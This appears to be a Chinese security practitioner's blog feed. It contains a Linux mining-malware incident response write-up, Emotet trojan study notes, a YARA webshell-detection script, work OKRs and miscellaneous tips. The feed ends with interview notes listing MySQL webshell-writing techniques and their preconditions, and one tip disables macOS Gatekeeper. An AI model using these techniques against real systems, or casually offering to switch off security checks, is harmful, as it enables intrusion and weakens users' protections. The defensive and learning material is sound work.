alt="image-20230315235634675"></p><p>10、查看对应可疑服务，确认为拉起恶意挖矿进程服务，关联服务配置时间</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230315235730110.png" alt="image-20230315235730110"></p><p>至此确认恶意服务配置拉起挖矿进程，且存在对应计划任务确保挖矿进程存活。同时发现挖矿病毒本体，以及同目录下库文件劫持、挖矿配置信息等恶意文件。</p><h1 id="二、溯源分析"><a href="#二、溯源分析" class="headerlink" title="二、溯源分析"></a>二、溯源分析</h1><p>1、在root用户目录下发现SSH公钥，同时还发现写入了其他恶意字符</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316100854298.png" alt="image-20230316100854298"></p><p>2、关联恶意文件、登录日志等创建时间分析</p><p>定时任务创建时间2022.12.15 02:29</p><p>定时任务执行时间2022.12.15 02:30</p><p>挖矿病毒落地时间2022.12.15 02:52</p><p>SSH公钥落地时间2022.02.18 05:10</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316101253066.png" alt="image-20230316101253066"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316101359784.png" alt="image-20230316101359784"></p><p>3、查看对应登录日志，发现IP 192.168.100.253在时间点2022.12.15 02:24尝试爆破，且在后续时间点2022.12.15 02:34发现成功登录日志</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316102236033.png" alt="image-20230316102236033"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316101621132.png" alt="image-20230316101621132"></p><p>4、但登录成功时间晚于定时任务执行时间，结合各个恶意文件落地时间，推测SSH公钥为入侵源头，且近一次访问时间在文件落地前，符合猜测</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316103825791.png" alt="image-20230316103825791"></p><p>5、总结：</p><p>攻击者：192.168.100.253</p><p>本次攻击最早发起时间：2022.12.15 02:24</p><p>攻击方式：SSH爆破、SSH公钥登录</p><p>时间线梳理：</p><p>1)早期服务器遭受攻击，主机上留有SSH公钥，文件落地时间（2022.02.18 05:10）</p><p>2)攻击者通过SSH公钥登录，时间点2022.12.15 02:24</p><p>3)攻击者IP  192.168.100.253在时间点2022.12.15 02:24尝试SSH爆破</p><p>4)定时任务在时间点2022.12.15 02:29，随后02:30执行</p><p>5)攻击者IP  192.168.100.253登录成功，日志记录时间点2022.12.15 02:34</p><p>6)攻击者上传挖矿病毒等恶意文件，时间点2022.12.15 02:52</p><h1 id="三、清理后门"><a href="#三、清理后门" class="headerlink" title="三、清理后门"></a>三、清理后门</h1><p>1、清除库文件劫持，命令恢复正常，挖矿进程取消隐藏</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316104702903.png" alt="image-20230316104702903"></p><p>2、删除计划任务</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316104903592.png" alt="image-20230316104903592"></p><p>3、删除恶意服务</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316105144896.png" alt="image-20230316105144896"></p><p>4、删除挖矿病毒目录下文件、SSH公钥</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316105338099.png" alt="image-20230316105338099"></p><p>5、终止当前挖矿进程</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316105927228.png" alt="image-20230316105927228"></p><p>6、进程、网络连接均未发现异常，重启服务器后无异常</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230316110312786.png" alt="image-20230316110312786"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;客户服务器异常卡顿，请进行相关排查和处置并溯源攻击路径&lt;/p&gt;
&lt;h1 id=&quot;要求&quot;&gt;&lt;a href=&quot;#要求&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="学习" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="应急响应" scheme="http://example.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>重新学习</title>
    <link href="http://example.com/2023/03/15/%E9%87%8D%E6%96%B0%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2023/03/15/%E9%87%8D%E6%96%B0%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-03-15T12:12:09.000Z</published>
    <updated>2023-03-15T14:01:25.439Z</updated>
    
    <content type="html"><![CDATA[<p>Linux应急小Tips</p><p>下载busybox</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q --timeout=5 https://busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/busybox-x86_64 -O /tmp/busybox</span><br></pre></td></tr></table></figure><p>使用tcpdump抓包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0</span><br><span class="line">--简单粗暴</span><br></pre></td></tr></table></figure><p>Linux进程PID小知识</p><p>PID 分配上限可以通过 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;pid_max 查询，一般默认为 32768。</p><p>对于 PID&lt;300 的情况只允许分配一次，一般对应了系统线程，所以一般进程 PID 分配范围是 (300, 32768) 。</p><p>每个 PID 分配成功后，会将当前的 PID 设置为 last_pid，下次便从 last_pid + 1 开始往下查找。</p><p>通过位图记录已分配和未分配 PID，单页为 4KB ，对应了默认的最大进程数 32768 。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Linux应急小Tips&lt;/p&gt;
&lt;p&gt;下载busybox&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>工作定的小目标忽略忽略</title>
    <link href="http://example.com/2023/03/10/3-10/"/>
    <id>http://example.com/2023/03/10/3-10/</id>
    <published>2023-03-10T12:01:33.000Z</published>
    <updated>2023-03-11T08:03:54.578Z</updated>
    
    <content type="html"><![CDATA[<h2 id="O-目标-1保障好项目的质量，进一步提升内外部满意度-96-和区域服务口碑和价值感知—服务体验"><a href="#O-目标-1保障好项目的质量，进一步提升内外部满意度-96-和区域服务口碑和价值感知—服务体验" class="headerlink" title="O(目标)-1保障好项目的质量，进一步提升内外部满意度(96%)和区域服务口碑和价值感知—服务体验"></a>O(目标)-1保障好项目的质量，进一步提升内外部满意度(96%)和区域服务口碑和价值感知—服务体验</h2><h3 id="关键结果KR-1"><a href="#关键结果KR-1" class="headerlink" title="关键结果KR-1"></a>关键结果KR-1</h3><p>每周检视事件闭环工作，关注闭环时效，将事件跟踪表与交付物一并整理发送</p><h3 id="关键结果KR-2"><a href="#关键结果KR-2" class="headerlink" title="关键结果KR-2"></a>关键结果KR-2</h3><p>针对事件较少客户（近一周无事件），主动分析设备日志，梳理外部攻击情况整理报告推送</p><h3 id="关键结果KR-3"><a href="#关键结果KR-3" class="headerlink" title="关键结果KR-3"></a>关键结果KR-3</h3><p>通过资产梳理、暴露面梳理、威胁狩猎、免费重保等方式对感知度较低的客户提升感知</p><h3 id="关键结果KR-4"><a href="#关键结果KR-4" class="headerlink" title="关键结果KR-4"></a>关键结果KR-4</h3><p>根据客户不同需求，提供非标准化交付，例如：每月提供病毒主机，每周整理弱口令等</p><h2 id="O-目标-2实现续约率80-x2F-续费率100-x2F-转化率40-—客户经营"><a href="#O-目标-2实现续约率80-x2F-续费率100-x2F-转化率40-—客户经营" class="headerlink" title="O(目标)-2实现续约率80% &#x2F;续费率100%&#x2F;转化率40%—客户经营"></a>O(目标)-2实现续约率80% &#x2F;续费率100%&#x2F;转化率40%—客户经营</h2><h3 id="关键结果KR-1-1"><a href="#关键结果KR-1-1" class="headerlink" title="关键结果KR-1"></a>关键结果KR-1</h3><p>加强客户预算管理意识，在预算前后有意识的开展主动服务，提供一到两次主动服务案例</p><h3 id="关键结果KR-2-1"><a href="#关键结果KR-2-1" class="headerlink" title="关键结果KR-2"></a>关键结果KR-2</h3><p>持续提升测试效果和效率，确保个人测试项目转正率超过40%，关注组内测试项目，跟进项目满意度关键举措</p><h3 id="关键结果KR-3-1"><a href="#关键结果KR-3-1" class="headerlink" title="关键结果KR-3"></a>关键结果KR-3</h3><p>参与中心相关意识培训，探讨扩容、增值服务的拓展思路，对小资产客户、续费风险客户进行风险提前识别和解决</p><h3 id="关键结果KR-4-1"><a href="#关键结果KR-4-1" class="headerlink" title="关键结果KR-4"></a>关键结果KR-4</h3><p>检视提供商机有效性，与销售或客户沟通，推动商机落地</p><h2 id="O-目标-3确保全年毛利55-—效率提升"><a href="#O-目标-3确保全年毛利55-—效率提升" class="headerlink" title="O(目标)-3确保全年毛利55%—效率提升"></a>O(目标)-3确保全年毛利55%—效率提升</h2><h3 id="关键结果KR-1-2"><a href="#关键结果KR-1-2" class="headerlink" title="关键结果KR-1"></a>关键结果KR-1</h3><p>纯MSS客户，相关汇报、问题处置、应急响应等工作，在个人能力满足前提下尽可能由服务经理承接</p><h3 id="关键结果KR-2-2"><a href="#关键结果KR-2-2" class="headerlink" title="关键结果KR-2"></a>关键结果KR-2</h3><p>加强客户经营意识，综合服务、联合交付等项目，在不影响客户满意度情况下，尽可能降低上门处置、汇报等经营成本</p><h3 id="关键结果KR-3-2"><a href="#关键结果KR-3-2" class="headerlink" title="关键结果KR-3"></a>关键结果KR-3</h3><p>根据客户高潜、低潜客户筛选标准，减少不必要的消耗提升整体工作效率及人均效益（主要在主动服务上进行区分）</p><h2 id="O-目标-4任职晋级达到T2级别以上—个人提升"><a href="#O-目标-4任职晋级达到T2级别以上—个人提升" class="headerlink" title="O(目标)-4任职晋级达到T2级别以上—个人提升"></a>O(目标)-4任职晋级达到T2级别以上—个人提升</h2><h3 id="关键结果KR-1-3"><a href="#关键结果KR-1-3" class="headerlink" title="关键结果KR-1"></a>关键结果KR-1</h3><p>积极参与运营中心服务经理技术能力提升专项，通过培训、实践、考核，年底任职晋级达到T2级别</p><h3 id="关键结果KR-2-3"><a href="#关键结果KR-2-3" class="headerlink" title="关键结果KR-2"></a>关键结果KR-2</h3><p>参与网络安全实验室，积累优秀报告</p><h3 id="关键结果KR-3-3"><a href="#关键结果KR-3-3" class="headerlink" title="关键结果KR-3"></a>关键结果KR-3</h3><p>针对Windows、Linux常见上机排查流程输出文档，上传知识库</p><h3 id="关键结果KR-4-2"><a href="#关键结果KR-4-2" class="headerlink" title="关键结果KR-4"></a>关键结果KR-4</h3><p>提升漏洞挖掘能力，类似（威胁狩猎、客户通报漏洞等）场景下，积累漏洞挖掘经验并记录文档</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;O-目标-1保障好项目的质量，进一步提升内外部满意度-96-和区域服务口碑和价值感知—服务体验&quot;&gt;&lt;a href=&quot;#O-目标-1保障好项目的质量，进一步提升内外部满意度-96-和区域服务口碑和价值感知—服务体验&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    <category term="工作" scheme="http://example.com/categories/%E5%B7%A5%E4%BD%9C/"/>
    
    
    <category term="OKR" scheme="http://example.com/tags/OKR/"/>
    
  </entry>
  
  <entry>
    <title>service A Tao restart</title>
    <link href="http://example.com/2023/03/10/restart/"/>
    <id>http://example.com/2023/03/10/restart/</id>
    <published>2023-03-10T11:43:42.000Z</published>
    <updated>2023-03-15T14:17:29.897Z</updated>
    
    <content type="html"><![CDATA[<p>博客重新上线，哈哈啊哈哈&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;-</p><p>顺带记录下最近踩的坑</p><h3 id="Tips1"><a href="#Tips1" class="headerlink" title="Tips1"></a>Tips1</h3><p>无法打开应用，因为Apple无法检查其是否包含恶意软件解决方法</p><p>在应用程序-&gt;实用工具中找到<code>终端</code>，打开，执行下面一条命令，禁用新安全检查即可。</p><p>sudo spctl –master-disable</p><h3 id="Tips2"><a href="#Tips2" class="headerlink" title="Tips2"></a>Tips2</h3><p>测试图床Typora+PicGo+七牛云</p><p>参考链接：</p><p><code>https://blog.csdn.net/qq_45931842/article/details/119544403</code></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230310201154080.png" alt="image-20230310201154080"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;博客重新上线，哈哈啊哈哈&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;-&lt;/p&gt;
&lt;p&gt;顺带记录下最近踩的坑&lt;/p&gt;
&lt;h3 id=&quot;Tips1&quot;&gt;&lt;a href=&quot;#Tips1&quot; class=&quot;headerlink&quot; title=&quot;Tips1&quot;&gt;&lt;/a&gt;Ti</summary>
      
    
    
    
    <category term="踩坑" scheme="http://example.com/categories/%E8%B8%A9%E5%9D%91/"/>
    
    
    <category term="mac" scheme="http://example.com/tags/mac/"/>
    
    <category term="小技巧" scheme="http://example.com/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>3-24</title>
    <link href="http://example.com/2020/03/24/3.24/"/>
    <id>http://example.com/2020/03/24/3.24/</id>
    <published>2020-03-24T01:37:52.000Z</published>
    <updated>2020-03-24T10:43:11.362Z</updated>
    
    <content type="html"><![CDATA[<p>学习Emotet木马特征，以及python导入egg</p><span id="more"></span><h1 id="freebuf"><a href="#freebuf" class="headerlink" title="freebuf"></a>freebuf</h1><h2 id="学习链接"><a href="#学习链接" class="headerlink" title="学习链接"></a>学习链接</h2><p>面试题</p><blockquote><p><a href="https://www.freebuf.com/vuls/228750.html">https://www.freebuf.com/vuls/228750.html</a></p></blockquote><p>任意文件读取漏洞经验</p><blockquote><p><a href="https://www.freebuf.com/articles/web/229648.html">https://www.freebuf.com/articles/web/229648.html</a></p></blockquote><p>webug靶场通关记录</p><blockquote><p><a href="https://www.freebuf.com/articles/web/151617.html">https://www.freebuf.com/articles/web/151617.html</a></p></blockquote><h2 id="修复CVE-2020-0796漏洞"><a href="#修复CVE-2020-0796漏洞" class="headerlink" title="修复CVE-2020-0796漏洞"></a>修复CVE-2020-0796漏洞</h2><ol><li><p>腾讯电脑管家 <a href="http://dlied6.qq.com/invc/QQPatch/QuickFix_SMB0796.exe"><code>SMB漏洞修复工具</code></a></p></li><li><p>安天 <code>SMBv3</code> 的 <code>RCE</code><a href="https://bbs.antiy.cn/forum.php?mod=viewthread&tid=83848">漏洞强化工具</a></p></li><li><p>官方补丁 </p><blockquote><p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796</a></p></blockquote></li><li><p>如无法立即安装补丁，建议禁用 SMBv3 压缩，添加DisableCompression项，无需重启，可以防止远程命令执行，但无法防止针对 SMB 客户端的攻击，<code>powershell</code>代码:</p></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot; DisableCompression -Type DWORD -Value 1 -Force</span><br></pre></td></tr></table></figure><h1 id="Emotet木马"><a href="#Emotet木马" class="headerlink" title="Emotet木马"></a>Emotet木马</h1><p><strong>什么是Emotet木马病毒？</strong></p><p>Emotet（也被称为Geodo或Heodo），一种模块化木马病毒，据称是由黑客组织Mealybug于2014年开发的。Emotet最初被设计为银行木马，被Mealybug用来通过垃圾电子邮件感染受害者设备，并在受害者登陆网银或加密钱包时窃取登陆凭证、个人身份信息（PII）和财务信息等。</p><p>不仅如此，Emotet在后续的发展中还被添加了传播其他恶意软件的能力，包括其他银行木马（如Trickbot）。</p><p><strong>恶意文档分为两类</strong></p><p>在今年1月份，用来传播Emotet木马的恶意文档主要可以分为两类：第一类约占80%，虽然它们具有.doc扩展名，但实际上是XML文件；第二类则是典型的带有嵌入式恶意宏的Word文档。</p><p>Menlo Security公司表示，将具有Base64编码数据的XML文档伪装成Word文档可能是为了逃避杀毒软件的检测。实际上，确实只有很少的杀毒软件能将这些用来传播Emotet木马的文档检测为“恶意”。</p><p>虽然不同的恶意文档使用了的标题和内容也不尽相同，但几乎都使用了Microsoft Office的logo来诱使攻击目标启用恶意宏。</p><p><strong>感染过程十分复杂</strong></p><p>Menlo Security公司表示，新的Emotet变种的感染过程非常复杂，并遵循一个严格的流程。初始恶意脚本会生成多个进程，而这些进程将启动一个Powershell脚本，以将主有效载荷下载到受感染计算机的TEMP文件夹中。</p><p>一旦主有效载荷被下载到受感染计算机，它就将会被激活，并开始向包含在一个命令和控制服务器（C2）网址列表中的所有网址按顺序发出连接请求。一旦连接成功，Emotet与攻击者的C2服务器也就建立了连接，而攻击者便可以通过C2通信来发送其他恶意软件。</p><p><strong>实际分析对象</strong></p><p>接触到的样本情况是，感染主机有数个下载者要求攻击溯源，在经历了镜像格式转换、关键文件位置排查、日志筛选，在powershell日志中找到了可疑记录。通过排查时间线，找到了可疑服务的开启，接着锁定时间在邮件中找到相关的样本。直接发现可疑邮件附带的doc文档，逆向分析发现有宏代码，打开执行powershell，具体操作从CC列表中下载exe文件，且有多个CC备用，下载成功之后解密出shellcode复制本身到服务目录下，之后释放文件消除痕迹。</p><p><strong>freebuf分析</strong></p><blockquote><p><a href="https://www.freebuf.com/articles/terminal/180390.html">https://www.freebuf.com/articles/terminal/180390.html</a></p></blockquote><h1 id="毕业设计"><a href="#毕业设计" class="headerlink" title="毕业设计"></a>毕业设计</h1><h2 id="关于sys-path-append"><a href="#关于sys-path-append" class="headerlink" title="关于sys.path.append()"></a>关于sys.path.append()</h2><blockquote><p><a href="https://www.cnblogs.com/mandy-study/p/7735801.html">https://www.cnblogs.com/mandy-study/p/7735801.html</a>)</p></blockquote><p>当我们导入一个模块时：import  xxx，默认情况下python解析器会搜索当前目录、已安装的内置模块和第三方模块，搜索路径存放在<strong>sys模块的path</strong>中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">**[python]** [view plain]</span><br><span class="line"></span><br><span class="line">(http://blog.csdn.net/jojoy_tester/article/details/54575264#) [copy](http://blog.csdn.net/jojoy_tester/article/details/54575264#)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">[print](http://blog.csdn.net/jojoy_tester/article/details/54575264#)[?](http://blog.csdn.net/jojoy_tester/article/details/54575264#)</span><br><span class="line"></span><br><span class="line">1. \&gt;&gt;&gt; import sys </span><br><span class="line">2. \&gt;&gt;&gt; sys.path </span><br><span class="line"></span><br><span class="line">[&#x27;&#x27;, &#x27;C:\\Python352\\Lib\\idlelib&#x27;, &#x27;C:\\Python352\\python35.zip&#x27;, &#x27;C:\\Python352\\DLLs&#x27;, &#x27;C:\\Python352\\lib&#x27;, &#x27;C:\\Python352&#x27;, &#x27;C:\\Python352\\lib\\site-packages&#x27;, &#x27;C:\\Python352\\lib\\site-packages\\setuptools-28.6.1-py3.5.egg&#x27;, &#x27;C:\\Python352\\lib\\site-packages\\pip-8.1.2-py3.5.egg&#x27;, &#x27;C:\\Python352\\lib\\site-packages\\requests-2.11.1-py3.5.egg&#x27;, &#x27;C:\\Python352\\lib\\site-packages\\xlutils-2.0.0-py3.5.egg&#x27;, &#x27;C:\\Python352\\lib\\site-packages\\xlwt-1.1.2-py3.5.egg&#x27;, &#x27;C:\\Python352\\lib\\site-packages\\pymongo-3.3.1-py3.5-win-amd64.egg&#x27;, &#x27;C:\\Python352\\lib\\site-packages\\pytz-2016.7-py3.5.egg&#x27;, &#x27;C:\\Python352\\lib\\site-packages\\zope.interface-4.3.3-py3.5-win-amd64.egg&#x27;] </span><br></pre></td></tr></table></figure><p>此时sys.path 返回的是一个列表！该路径已经添加到系统的环境变量了，当我们要添加自己的搜索目录时，可以通过列表的append()方法</p><p>1.对于模块和自己写的脚本不在同一个目录下，在脚本开头加sys.path.append(‘xxx’)：</p><p>eg.　　import sys </p><p>　　　 sys.path.append(’引用模块的地址’) </p><p>2.把路径添加到系统的环境变量，或把该路径的文件夹放进已经添加到系统环境变量的路径内。环境变量的内容会自动添加到模块搜索路径中。</p><p>p.s.可以通过dir(sys)来查看他里面的方法和成员属性。</p><h2 id="关于python2和3适配"><a href="#关于python2和3适配" class="headerlink" title="关于python2和3适配"></a>关于python2和3适配</h2><p>在开头加上from <strong>future</strong> import print_function这句之后，即使在python2.X，使用print就得像python3.X那样加括号使用。python2.X中print不需要括号，而在python3.X中则需要。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># python2.7</span><br><span class="line">print &quot;Hello world&quot;</span><br><span class="line"></span><br><span class="line"># python3</span><br><span class="line">print(&quot;Hello world&quot;)</span><br></pre></td></tr></table></figure><p>　　如果某个版本中出现了某个新的功能特性，而且这个特性和当前版本中使用的不兼容，也就是它在该版本中不是语言标准，那么我如果想要使用的话就需要从future模块导入。</p><p>　　其他例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from __future__ import division</span><br><span class="line">from __future__ import absolute_import</span><br><span class="line">from __future__ import with_statement</span><br></pre></td></tr></table></figure><p>　　加上这些，如果你的python版本是python2.X，你也得按照python3.X那样使用这些函数</p><h2 id="webshell检测"><a href="#webshell检测" class="headerlink" title="webshell检测"></a>webshell检测</h2><p>利用yara规则匹配检测webshell</p><p>导入egg包</p><p>调用公用检测函数</p><p>编译yara规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def getRules(self, yara):</span><br><span class="line">    index = 0</span><br><span class="line">    filepath = &#123;&#125;</span><br><span class="line">    for dirpath, dirs, files in os.walk(self.rule):</span><br><span class="line">    #os.walk() 方法是一个简单易用的文件、目录遍历器。</span><br><span class="line">        for file in files:</span><br><span class="line">            ypath = os.path.join(dirpath, file)</span><br><span class="line">            key = &quot;rule&quot; + str(index)</span><br><span class="line">            filepath[key] = ypath</span><br><span class="line">            index += 1</span><br><span class="line">            #遍历文件</span><br><span class="line">    yararule = yara.compile(filepaths=filepath)</span><br><span class="line">    return yararule</span><br></pre></td></tr></table></figure><p>根据版本导入yara模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">def init_scan(self):</span><br><span class="line">       suspicious, malice, skip = False, False, False</span><br><span class="line">       try:</span><br><span class="line">           SYS_PATH = get_value(&#x27;SYS_PATH&#x27;)</span><br><span class="line">           #绝对路径</span><br><span class="line">           if sys.version_info &lt; (3, 0):</span><br><span class="line">           #根据python版本导入模块</span><br><span class="line">               DEPENDENT_LIBRARIES_2_6 = &quot;/lib/egg/yara_python-3.5.0-py2.6-linux-2.32-x86_64.egg&quot;</span><br><span class="line">               DEPENDENT_LIBRARIES_3_10 = &quot;/lib/egg/yara_python-3.5.0-py2.7-linux-3.10-x86_64.egg&quot;</span><br><span class="line">               DEPENDENT_LIBRARIES_4_20 = &quot;/lib/egg/yara_python-3.8.1-py2.7-linux-4.20-x86_64.egg&quot;</span><br><span class="line">               DEPENDENT_LIBRARIES_16 = &quot;/lib/egg/yara_python-3.5.0-py2.7-macosx-10.12-x86_64.egg&quot;</span><br><span class="line">               DEPENDENT_LIBRARIES_17 = &quot;/lib/egg/yara_python-3.5.0-py2.7-macosx-10.13-x86_64.egg&quot;</span><br><span class="line">               _kernel = platform.release()</span><br><span class="line">               #platform.release操作系统版本号</span><br><span class="line">               if _kernel.startswith(&#x27;2.6&#x27;):</span><br><span class="line">                   sys.path.append(SYS_PATH + DEPENDENT_LIBRARIES_2_6)</span><br><span class="line">               elif _kernel.startswith(&#x27;3.&#x27;) and (&quot;6.&quot; in str(platform.dist())):</span><br><span class="line">                   sys.path.append(SYS_PATH + DEPENDENT_LIBRARIES_2_6)</span><br><span class="line">               elif _kernel.startswith(&#x27;3.&#x27;):</span><br><span class="line">                   sys.path.append(SYS_PATH + DEPENDENT_LIBRARIES_3_10)</span><br><span class="line">               elif _kernel.startswith(&#x27;4.&#x27;):</span><br><span class="line">                   sys.path.append(SYS_PATH + DEPENDENT_LIBRARIES_4_20)</span><br><span class="line">               elif _kernel.startswith(&#x27;16.&#x27;):</span><br><span class="line">                   sys.path.append(SYS_PATH + DEPENDENT_LIBRARIES_16)</span><br><span class="line">               elif _kernel.startswith(&#x27;17.&#x27;):</span><br><span class="line">                   sys.path.append(SYS_PATH + DEPENDENT_LIBRARIES_17)</span><br><span class="line">               else:</span><br><span class="line">                   return suspicious, malice, True</span><br><span class="line">               import yara</span><br><span class="line">           else:</span><br><span class="line">               return suspicious, malice, True</span><br></pre></td></tr></table></figure><p><img src="http://www.xt996.top/muggle/2020/03/24/3.24/3.24-1.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习Emotet木马特征，以及python导入egg&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="木马" scheme="http://example.com/tags/%E6%9C%A8%E9%A9%AC/"/>
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
    <category term="毕业设计" scheme="http://example.com/tags/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>渗透面试题</title>
    <link href="http://example.com/2020/03/24/%E6%B8%97%E9%80%8F%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <id>http://example.com/2020/03/24/%E6%B8%97%E9%80%8F%E9%9D%A2%E8%AF%95%E9%A2%98/</id>
    <published>2020-03-24T01:37:52.000Z</published>
    <updated>2020-03-24T03:03:38.249Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>近期面试喜欢问的问题，总结了一下。</strong></p><h2 id="岗位分析"><a href="#岗位分析" class="headerlink" title="岗位分析"></a>岗位分析</h2><p>整体安全行业，随着网络安全的大火，Web安全入门浅，培训机构遍地开会，大量花里胡哨的人才都争着用了进来，所以想要突出，必须要有自己的一技之长。</p><p>那么当前网络安全的技术岗位，热门方向有很多，说几个例子。</p><table><thead><tr><th align="left">逆向</th></tr></thead><tbody><tr><td align="left"><strong>APT</strong></td></tr><tr><td align="left"><strong>代码审计</strong></td></tr><tr><td align="left"><strong>区块链</strong></td></tr><tr><td align="left"><strong>渗透（不限于内网、CS客户端，APP，小程序，微服务等）</strong></td></tr></tbody></table><h2 id="常见面试题及参考"><a href="#常见面试题及参考" class="headerlink" title="常见面试题及参考"></a>常见面试题及参考</h2><h3 id="问：MySQL写WebShell有几种方式，利用条件"><a href="#问：MySQL写WebShell有几种方式，利用条件" class="headerlink" title="问：MySQL写WebShell有几种方式，利用条件"></a>问：MySQL写WebShell有几种方式，利用条件</h3><p>答：</p><p>一、</p><blockquote><p>union select 后写入</p><p>lines terminated by 写入</p><p>lines starting by 写入</p><p>fields terminated by 写入</p><p>COLUMNS terminated by 写入</p></blockquote><p>二、</p><blockquote><p>root权限</p><p>GPC关闭（能使用单引号），magic_quotes_gpc&#x3D;On</p><p>有绝对路径（读文件可以不用，写文件必须）</p><p>没有配置–secure-file-priv</p><p>成功条件：有读写的权限，有create、insert、select的权限</p></blockquote><h3 id="问：Sql-注入无回显的情况下，利用-DNSlog，mysql-下利用什么构造代码，mssql-下又如何？"><a href="#问：Sql-注入无回显的情况下，利用-DNSlog，mysql-下利用什么构造代码，mssql-下又如何？" class="headerlink" title="问：Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何？"></a>问：Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 